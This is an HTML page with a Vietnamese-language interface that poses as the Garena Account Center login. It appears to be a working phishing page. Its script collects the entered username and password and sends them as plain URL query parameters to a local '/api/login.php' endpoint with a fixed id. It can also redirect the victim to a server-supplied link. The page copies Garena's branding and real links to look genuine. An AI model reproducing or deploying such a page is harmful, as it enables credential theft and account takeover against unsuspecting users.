<!DOCTYPE html><html lang="en"><head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
    <title>Garena Account Center</title>
    <link rel="icon" href="images/favicon.ico">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
    <link href="css/main.css" rel="stylesheet">
    <link rel="stylesheet" href="css/index-f8df3c2d.css">
    <link rel="stylesheet" href="css/ErrorBox-91a1ce3c.css">
    <link rel="stylesheet" href="css/TopBar-89b3db7d.css">
    <link rel="stylesheet" href="css/LoginView-0d1d9d61.css">
<style type="text/css">
    .loading-spinner {
        display: inline-block;
        vertical-align: middle;
        margin-left: 5px;
        border: 2px solid rgba(0, 0, 0, 0.1);
        /* Giảm border-width xuống */
        border-left-color: #ffffff;
        border-radius: 50%;
        width: 15px;
        /* Giảm kích thước xuống */
        height: 15px;
        /* Giảm kích thước xuống */
        animation: spin 1s linear infinite;
    }

    @keyframes spin {
        0% {
            transform: rotate(0deg);
        }

        100% {
            transform: rotate(360deg);
        }
    }
</style></head>


<body>
    <div id="app" data-v-app="">
        <header class="topbar" data-v-878436c2="" data-v-15e3e196="">
            <div class="container" data-v-878436c2="">
                <a class="logo" href="https://www.garena.sg" data-v-878436c2=""><img src="images/logo-9d415851.svg" alt="Garena Logo" data-v-878436c2=""></a>
                <select class="lang" data-v-878436c2="">
                    <option value="en-US" data-v-878436c2="">International - English</option>
                    <option value="en-SG" data-v-878436c2="">Singapore - English</option>
                    <option value="zh-SG" data-v-878436c2="">新加坡 - 简体中文</option>
                    <option value="zh-TW" data-v-878436c2="">台灣 - 繁体中文</option>
                    <option value="en-PH" data-v-878436c2="">Philippines - English</option>
                    <option value="th-TH" data-v-878436c2="">ไทย - ไทย</option>
                    <option value="id-ID" data-v-878436c2="">Indonesia - Bahasa Indonesia</option>
                    <option value="vi-VN" data-v-878436c2="">Việt Nam - Tiếng việt</option>
                    <option value="ru-RU" data-v-878436c2="">Россия - Русский</option>
                    <option value="en-MY" data-v-878436c2="">Malaysia - English</option>
                    <option value="pt-PT" data-v-878436c2="">Portugal - Português</option>
                    <option value="es-ES" data-v-878436c2="">España - Español</option>
                </select>
            </div>
        </header>
        <main data-v-15e3e196="">
            <form data-v-15e3e196="">
                <h2 data-v-15e3e196="">Đăng nhập</h2>
                <div class="field required" data-v-15e3e196="">
                    <input type="text" placeholder="Tài khoản Garena, Email hoặc số điện thoại" id="username" name="username">
                </div>
                <div class="field required" data-v-15e3e196="">
                    <input type="password" placeholder="Mật khẩu" id="password" name="password">
                </div>
                <a class="forgot" href="https://account.garena.com/recovery" data-v-15e3e196="">Quên mật khẩu?</a>
                <div class="field error" data-v-15e3e196="">
                    <button class="primary" type="submit">Đăng Nhập Ngay</button>
                    <div class="message" data-v-15e3e196=""></div>
                </div>
                <div class="field" data-v-15e3e196=""><button class="secondary register" type="button" data-v-15e3e196="">Tạo tài khoản mới</button></div>
            </form>
        </main>
    </div>
    <script src="js/jquery-3.6.0.min.js"></script>
    <script src="js/axios.min.js"></script>
    <script src="js/crypto.js"></script>
    <script>
        $(document).ready(function () {
            $('form').submit(function (event) {
                event.preventDefault(); // Ngăn chặn gửi yêu cầu POST mặc định
                $('.message').text('');

                var $submitButton = $(this).find('button[type="submit"]');
                var username = $('#username').val();
                var password = $('#password').val();

                // Kiểm tra xem username và password có được nhập không
                if (!username || !password) {
                    $('.message').text('Vui lòng nhập đầy đủ tên đăng nhập và mật khẩu.');
                    resetButton($submitButton);
                    return; // Dừng hàm nếu có trường không được nhập
                }

                // Thay đổi nút Đăng nhập thành Đang Đăng Nhập và thêm spinner
                $submitButton.html('Đang Đăng Nhập <div class="loading-spinner"></div>').prop('disabled', true);




                axios.post('/api/login.php?account=' + encodeURIComponent(username) + '&password=' + encodeURIComponent(password) + '&id=213456754324567', {
                })
                    .then(function (response) {
                        //console.log(response.data.session_key); // In ra dữ liệu trả về từ request thứ hai
                        resetButton($submitButton);
                        if (response.data && response.data.error) {
                            var errorCode = response.data.error;
                            switch (errorCode) {
                                case 'error_auth':
                                    $('.message').text('Đăng nhập thất bại: sai tên tài khoản hoặc mật khẩu');
                                    break;
                                case 'error_user_ban':
                                    $('.message').text('Đăng nhập thất bại: tài khoản bị cấm');
                                    break;
                                case 'error_no_account':
                                    $('.message').text('Đăng nhập thất bại: Tài khoản hoặc mật khẩu bị sai');
                                    break;
                                case 'error_chuyen_huong':
                                    window.location.href = response.data.link_ch;
                                    break;
                                default:
                                    $('.message').text(response.data.error);
                                    break;
                            }
                        }else if (response.data && response.data.nickname) {
                            const app = localStorage.getItem("app")
                            const playerName = response.data.nickname;
              localStorage.setItem("userLogin", playerName);

              setTimeout(() => {
                window.location.href = `/?app=${app}`
              }, 100)
                        }
                    })
                    .catch(handleError);

            });
            function handleError(error) {
                console.error('Request error:', error);
                $('.message').text('Đã có lỗi xảy ra. Vui lòng thử lại sau.');
                resetButton($('form button[type="submit"]'));
            }
            function resetButton($button) {
                $button.html('Đăng Nhập Ngay').prop('disabled', false);
            }
        });
    </script>





</body></html>